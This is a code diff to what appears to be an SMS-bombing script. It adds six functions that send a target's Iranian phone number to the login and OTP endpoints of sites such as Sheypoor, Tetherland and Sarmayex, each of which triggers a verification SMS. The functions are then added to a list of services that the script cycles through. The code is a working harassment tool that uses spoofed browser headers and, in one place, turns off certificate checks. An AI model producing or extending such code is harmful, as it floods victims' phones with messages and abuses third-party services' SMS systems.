@@ -438,6 +438,73 @@ def sibapp(phone):
         return success
     except: return False
 
+
+def sheypoor(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "X-User-Agent": "Sheypoorx/3.6.627 browser/Mobile Safari.18.6 os/iOS.18.6",
+            "Referer": "https://www.sheypoor.com/",
+            "Content-Type": "application/json;charset=utf-8"
+        }
+        r = requests.post("https://www.sheypoor.com/api/v10.0.0/auth/send", 
+                          json={"username": phone}, headers=headers, timeout=15, verify=False)
+        
+        success = r.status_code in [200, 201, 202]
+        print(f"[{'+' if success else '-'}] Sheypoor: {r.status_code} - {r.text[:50]}")
+        return success
+    except: return False
+
+
+
+def shahrfarsh(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://shahrfarsh.com/Account/Login", data={"phoneNumber": phone}, timeout=10)
+        return r.status_code == 200
+    except: return False
+
+def tetherland(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://service.tetherland.com/api/v5/login-register", json={"mobile": phone}, timeout=10)
+        return r.status_code == 200
+    except: return False
+
+
+
+def sarmayex(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.get(f"https://api.sarmayex.com/api/v2/otp?receiver={phone}&otp_type=SMS&otp_section=REGISTER", 
+                         headers={"Client-Type": "pwa", "Origin": "https://sarmayex.com"}, timeout=10)
+        return r.status_code == 200
+    except: return False
+
+
+def riiha(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://www.riiha.ir/api/v1.0/authenticate", 
+                          json={"mobile": phone, "mobile_code": "", "type": "mobile"}, 
+                          headers={"Origin": "https://www.riiha.ir", "Referer": "https://www.riiha.ir/"}, timeout=10)
+        return r.status_code == 200
+    except: return False
+
+
+
+def raheeno(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.post("https://www.raheeno.com/account/SendOneCodeSms", 
+                          json={"Mobile": phone}, 
+                          headers={"X-Requested-With": "XMLHttpRequest"}, timeout=10)
+        return r.status_code == 200
+    except: return False
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
@@ -446,7 +513,7 @@ services = [
     arzplus, arzunex, azkivam, azno, basalam,
     bimeh, bimehland, bimeparsian, bornosmode, chapmatin,
     darunet, didar24, digikala, ebimename, ibime,
-    padmira, vakiljo, abantether, ubitex, twox, theshoes, tetherland, t4f, sibapp
+    padmira, vakiljo, abantether, ubitex, twox, theshoes, tetherland, t4f, sibapp, sheypoor, shahrfarsh, sarmayex, riiha, raheeno, tetherland
 ]
 
 
